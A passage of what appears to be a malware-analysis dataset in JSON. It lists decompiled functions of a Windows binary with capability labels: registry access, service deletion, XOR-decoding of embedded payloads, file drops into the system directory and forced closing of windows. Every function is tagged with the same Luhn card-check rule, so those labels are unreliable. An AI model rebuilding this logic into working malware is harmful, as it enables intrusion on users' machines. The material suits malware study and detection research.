        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040112a) overlaps instruction at (ram,0x00401129)\n// \n// WARNING: Removing unreachable block (ram,0x0040111a)\n\nuint __cdecl fcn.004010d0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    bool bVar6;\n    uint uStack852;\n    uint uStack848;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar3 = &stack0xfffffffc;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    uStack848 = 0;\n    uStack852 = 0x401153;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n    bVar6 = iVar2 == 0;\n    if (bVar6) {\n        return 0;\n    }\n    puVar5 = &stack0xfffffffc;\n    if ((!bVar6) && (puVar5 = &stack0xfffffffc,  bVar6)) {\n        puVar4 = &stack0xfffffcac;\n        puVar5 = &stack0xfffffcac;\n        cVar1 = '\\x10';\n        do {\n            puVar3 = puVar3 + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *puVar3;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    uStack852 = *(puVar5 + 8);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(puVar5 + -0x114);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 468
    },
    "004011b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004011b0(void)\n\n{\n    uchar uVar1;\n    \n    if (*0x41e828 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x41e828 = 1;\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00401470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401470(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401200(&var_68h, &var_4h);\n    fcn.00403a40(&var_68h, var_4h, 0x407010, 0xa380);\n    *arg_8h = 0x407010;\n    *arg_ch = 0xa380;\n    return;\n}\n",
        "token_count": 251
    },
    "004017d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004017d0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 != 0) {\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n        (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n        (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 132
    },
    "00401870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401882) overlaps instruction at (ram,0x00401881)\n// \n// WARNING: Removing unreachable block (ram,0x00401882)\n\nint32_t __cdecl fcn.00401870(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char extraout_CL;\n    char cVar4;\n    char extraout_CL_00;\n    int32_t unaff_EBX;\n    bool bVar5;\n    uint hKey;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    bVar5 = iVar2 != 0;\n    if (bVar5) {\n        return 0;\n    }\n    if ((bVar5) && (!bVar5)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n    uVar1 = uVar3 & 0xff;\n    if (uVar3 != 0) {\n        uVar1 = 0;\n    }\n    bVar5 = (POPCOUNT(uVar1) & 1U) == 0;\n    if ((bVar5) || (cVar4 = extraout_CL,  !bVar5)) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        uVar3 = uVar3 == 0;\n        cVar4 = extraout_CL_00;\n    }\n    *(unaff_EBX + -0xad03ab) = *(unaff_EBX + -0xad03ab) | 0x15;\n    *(unaff_EBX + -0x1a74a13a) = *(unaff_EBX + -0x1a74a13a) + cVar4;\n    return (uVar3 | 0x60) + 1;\n}\n",
        "token_count": 521
    },
    "00401920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401920(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 102
    },
    "00401b10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00401b10(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint lpdwResult;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405250;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x411778);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x411784);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &lpdwResult);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x411798);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(lpdwResult, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00401f40:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00401f4c:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x00401f07:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00401f4c;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00401d43:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00401920(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x4117ac);\n                        if (iVar1 != 0) goto joined_r0x00401d43;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00401eec:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00401f40;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00401eec;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.00401920(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.00401a40(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00401f07;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2451
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00402060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402060(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    float10 fVar4;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    bVar3 = false;\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fVar4 = (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    if ((!bVar3) && (bVar3)) {\n        *(puVar2 + 0x1f) = fVar4;\n        arg_8h = arg_8h + 5;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x411754);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x401fe0, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 447
    },
    "00402360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402373) overlaps instruction at (ram,0x00402371)\n// \n\nuint __cdecl fcn.00402360(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    char in_CH;\n    char *in_EDX;\n    \n    *in_EDX = *in_EDX + in_CH;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    uVar1 = fcn.00402790(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 150
    },
    "004023b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402443) overlaps instruction at (ram,0x0040243f)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.004023b0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint in_ECX;\n    uint32_t extraout_ECX;\n    int32_t *piVar6;\n    uint *puVar7;\n    uchar *puVar8;\n    uchar *puVar9;\n    int16_t unaff_DI;\n    ushort in_SS;\n    bool in_CF;\n    bool bVar10;\n    char cVar11;\n    char cVar12;\n    unkbyte10 extraout_ST0;\n    ulong uVar13;\n    \n    uVar3 = arg_ch - 1;\n    bVar10 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n    if (uVar3 == 0) {\n        if ((!bVar10) && (bVar10)) {\n            segment(in_SS, *0x10 + -8);\n            puVar9 = &stack0xfffffff8 & 0xffff0000 | *0x10 - 4;\n            if (in_CF) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if (bVar10) {\n                if (-1 < uVar3) {\n                    *(puVar9 + -4) = 0xf003f;\n                    puVar7 = puVar9 + -8;\n                    puVar9 = puVar9 + -8;\n                    *puVar7 = 0;\n                }\n                *0xb7bc9ea5 = *0xb7bc9ea5 + (in_ECX >> 8);\n                *(puVar9 + -4) = 0;\n                pcVar1 = _sym.imp.ADVAPI32.dll_OpenSCManagerA;\n                puVar8 = puVar9 + -8;\n                *(puVar9 + -8) = 0x402382;\n                uVar5 = (*pcVar1)();\n                *(puVar8 + -4) = uVar5;\n                *(puVar8 + -4) = arg_8h;\n                *(puVar8 + -8) = uVar5;\n                *(puVar8 + -0xc) = 0x402399;\n                uVar2 = fcn.00402790(*(puVar8 + -8), *(puVar8 + -4));\n                *(puVar8 + -4) = uVar5;\n                pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                *(puVar8 + -8) = 0x4023a5;\n                (*pcVar1)();\n                return uVar2;\n            }\n        }\n        fcn.004029b0();\n        fcn.004025f0();\n        cVar12 = '\\0';\n        cVar11 = (unaff_DI + 0x2562U & 0xffffff00 | unaff_DI + 0x2562U | 0x4c | extraout_ECX) < 0;\n        uVar13 = fcn.00402160();\n        piVar6 = uVar13 >> 0x20;\n        if ((cVar12 != cVar11) || (iVar4 = uVar13,  cVar12 == cVar11)) {\n            iVar4 = *0x41e848;\n        }\n        *(iVar4 + -0x7ce92414) = extraout_ST0;\n        *piVar6 = *piVar6 + 0x48a1df84;\n        bVar10 = *piVar6 == 0;\n        func_0xc0c5248b();\n        if (bVar10) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00404540();\n        }\n    }\n    uVar5 = (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar5;\n}\n",
        "token_count": 946
    },
    "00402940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040299e) overlaps instruction at (ram,0x0040299d)\n// \n\nint32_t __fastcall fcn.00402940(int32_t param_1, int32_t param_2, int32_t param_3, char param_4)\n\n{\n    char in_AL;\n    uint *puVar1;\n    uint *puVar2;\n    char extraout_CL;\n    char extraout_CL_00;\n    char cVar3;\n    char extraout_CL_01;\n    int32_t unaff_EBX;\n    int32_t *unaff_EDI;\n    uint *puVar4;\n    char in_SF;\n    char in_OF;\n    bool bVar5;\n    uint *puStackY40;\n    uint *puStackY36;\n    \n    if (in_OF == in_SF) {\n        if (in_OF == in_SF) goto code_r0x00402950;\n    }\n    else {\ncode_r0x00402950:\n        param_1 = param_3;\n        in_AL = param_4;\n    }\n    *(param_2 + -1) = *(param_2 + -1) | param_1 >> 8;\n    *unaff_EDI = *unaff_EDI + param_1;\n    *(param_2 + 0x51) = *(param_2 + 0x51) + in_AL;\n    puVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (puVar1 == NULL) {\n        return 0;\n    }\n    bVar5 = SBORROW1(extraout_CL, '\\x01');\n    puVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n    if (!bVar5) {\n        puStackY36 = puVar1;\n        puVar4 = puVar2;\n        cVar3 = extraout_CL_00;\n        if (bVar5) goto code_r0x0040299b;\n    }\n    puStackY36 = 0x4029a5;\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(puVar1);\n    puVar4 = puStackY40;\n    cVar3 = extraout_CL_01;\ncode_r0x0040299b:\n    *puVar4 = *puStackY36;\n    *(unaff_EBX + 0x5d5e5fc7) = *(unaff_EBX + 0x5d5e5fc7) + cVar3;\n    return puVar2 + 2;\n}\n",
        "token_count": 555
    },
    "004035c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004035fc) overlaps instruction at (ram,0x004035fa)\n// \n\nuint __cdecl fcn.004035c0(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar1;\n    uint uVar2;\n    ulong uVar3;\n    \n    arg_ch_00 = arg_ch;\n    arg_8h_00 = arg_8h;\n    uVar3 = fcn.004047c0(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    iVar1 = uVar3;\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if ((iVar1 < 0) || (uVar2 = uVar3 >> 0x20,  iVar1 >= 0)) {\n        uVar2 = arg_ch;\n    }\n    *(iVar1 + 0xc558b87) = uVar2;\n    fcn.004047c0(arg_8h_00, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 258
    },
    "00403a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403ab8) overlaps instruction at (ram,0x00403aaf)\n// \n// WARNING: Removing unreachable block (ram,0x00403aa9)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __thiscall fcn.00403a40(char *param_1, int32_t param_2, uint32_t param_3, int32_t param_4, char *param_5)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    char *pcStack12;\n    \n    bVar1 = false;\n    bVar3 = false;\n    bVar2 = param_5 == NULL;\n    pcStack12 = NULL;\n    if (!bVar2) {\n        do {\n            if (!bVar1 && !bVar2) {\n                if (bVar1 || bVar2) {\n                    if (bVar3) {\n                        *param_1 = (*param_1 - param_5) - bVar1;\n                        (*_sym.imp.USER32.dll_RegisterClassExA)();\n                        return;\n                    }\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            param_1 = pcStack12 + 1;\n            pcStack12[param_4] = pcStack12[param_4] ^ *(pcStack12 % param_3 + param_2);\n            bVar1 = param_1 < param_5;\n            bVar3 = SBORROW4(param_1, param_5);\n            bVar2 = param_1 == param_5;\n            pcStack12 = param_1;\n        } while (bVar1);\n    }\n    return;\n}\n",
        "token_count": 388
    },
    "00403b30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403b30(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403bc0(&var_68h, &var_4h);\n    fcn.00403a40(&var_68h, var_4h, 0x411814, 0xd000);\n    *arg_8h = 0x411814;\n    *arg_ch = 0xd000;\n    return;\n}\n",
        "token_count": 238
    },
    "00403d50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403e70)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403d50(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4113a4, &lpBuffer, arg_8h);\n    fcn.00403b30(&var_4h, &var_8h);\n    fcn.00403ea0(var_4h);\n    iVar1 = fcn.00404db0(&s, var_4h, var_8h);\n    if (iVar1 != 0) {\n        fcn.00403640(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 430
    },
    "00404080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004040a3) overlaps instruction at (ram,0x004040a1)\n// \n// WARNING: Control flow encountered bad instruction data\n\nchar * __cdecl fcn.00404080(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar2 = arg_8h + (arg_ch - arg_14h);\n    if (((-1 < pcVar2) && (-1 >= pcVar2)) || (arg_14h == 0)) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar2) {\n        do {\n            if ((!SBORROW4(arg_8h, pcVar2)) && (SBORROW4(arg_8h, pcVar2))) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                iVar1 = arg_14h;\n                pcVar3 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar3 = pcVar3 + 1;\n                    iVar1 = iVar1 + -1;\n                    if (iVar1 == 0) break;\n                    bVar5 = *pcVar3 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 416
    },
    "00404370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404370(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t unaff_EDI;\n    bool in_SF;\n    float10 in_ST0;\n    \n    if ((!in_SF) && (in_SF)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n    }\n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "004049e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004049e0(void)\n\n{\n    int32_t iVar1;\n    bool in_CF;\n    bool in_ZF;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 103
    },
    "00404a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404a70(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00404b40(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 54
    },
    "00404ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
